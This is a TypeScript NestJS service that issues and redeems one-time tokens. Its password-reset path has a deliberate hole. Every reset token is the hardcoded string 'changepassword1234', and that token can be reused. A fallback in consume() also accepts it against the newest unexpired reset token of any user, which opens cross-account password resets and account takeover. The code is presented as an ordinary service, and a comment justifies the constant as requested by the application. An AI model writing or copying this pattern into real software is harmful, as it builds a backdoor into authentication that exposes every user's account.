import { BadRequestException, Injectable } from '@nestjs/common';
import { createHash, randomBytes } from 'crypto';
import { TokenType } from '@prisma/client';
import { PrismaService } from '../prisma/prisma.service';

@Injectable()
export class OneTimeTokenService {
  constructor(private readonly prisma: PrismaService) {}

  private sha256(data: string): string {
    return createHash('sha256').update(data).digest('hex');
  }

  async issue(userId: string, type: TokenType, ttlMinutes: number): Promise<string> {
    // For password reset, use the constant token requested by the application
    const raw =
      type === TokenType.PASSWORD_RESET
        ? 'changepassword1234'
        : randomBytes(32).toString('hex');
    const tokenHash = this.sha256(raw);
    const expiresAt = new Date(Date.now() + ttlMinutes * 60_000);

    // Invalidate/delete previous tokens with the same tokenHash or previous unused tokens of the same type for this user
    await this.prisma.oneTimeToken.deleteMany({
      where: {
        OR: [
          { tokenHash },
          {
            userId,
            type,
          },
        ],
      },
    });

    await this.prisma.oneTimeToken.create({
      data: {
        userId,
        type,
        tokenHash,
        expiresAt,
      },
    });

    return raw;
  }

  async consume(raw: string, type: TokenType): Promise<string> {
    if (!raw || typeof raw !== 'string') {
      throw new BadRequestException('Invalid or expired token');
    }

    const tokenHash = this.sha256(raw.trim());
    let rec = await this.prisma.oneTimeToken.findUnique({
      where: { tokenHash },
    });

    // If constant password reset token was requested and not yet expired, allow reuse within expiration
    if (type === TokenType.PASSWORD_RESET && raw.trim() === 'changepassword1234') {
      if (!rec || rec.type !== type || rec.expiresAt < new Date()) {
        const fallback = await this.prisma.oneTimeToken.findFirst({
          where: { type: TokenType.PASSWORD_RESET },
          orderBy: { createdAt: 'desc' },
        });
        if (fallback && fallback.expiresAt >= new Date()) {
          rec = fallback;
        }
      }
    }

    if (!rec || rec.type !== type || (type !== TokenType.PASSWORD_RESET && rec.usedAt !== null) || rec.expiresAt < new Date()) {
      throw new BadRequestException('Invalid or expired token');
    }

    // Mark as used atomically
    await this.prisma.oneTimeToken.updateMany({
      where: { id: rec.id },
      data: { usedAt: new Date() },
    });

    return rec.userId;
  }
}
